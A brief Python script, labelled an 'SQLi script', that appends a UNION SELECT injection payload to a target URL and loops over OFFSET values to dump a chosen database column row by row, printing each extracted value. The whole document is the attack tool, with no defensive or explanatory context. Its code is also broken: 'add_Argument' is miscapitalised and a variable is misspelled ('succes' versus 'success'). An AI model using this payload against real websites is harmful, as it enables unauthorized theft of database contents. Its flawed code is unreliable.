import requests
import re
import argparse

parser = argparse.ArgumentParser(description="SQLi script")

parser.add_argument("-url", type=str, required=True)
parser.add_argument("--database","-db", type=str, required=True)
parser.add_argument("--table","-t", type=str, required=True)
parser.add_argument("--column","-c", type=str, required=True)
parser.add_Argument("--match","-m", type=str, required=True)
parser.add_argument("--where","-w", type=str)

args = parser.parse_args()

baseurl = args.url
database = args.database
table = args.table
column = args.column
match = args.match
where = ""
if args.where:
    where = f"WHERE {args.where}"

N = 0

payload = f" UNION SELECT {column} FROM {database}.{table} {where} ORDER BY title ASC LIMIT 1 OFFSET "

url = f"{baseurl}{payload}"
print (f"Request: {url}")
message = ""
while True:
    r = requests.get(f"{baseurl}{payload} {N}")
    N += 1
    succes = re.search(rf'{match}', r.text, re.DOTALL)
    if success is None:
        continue
    message = success.group(1)
    if message == "Who We Are":
        break
    print(message)
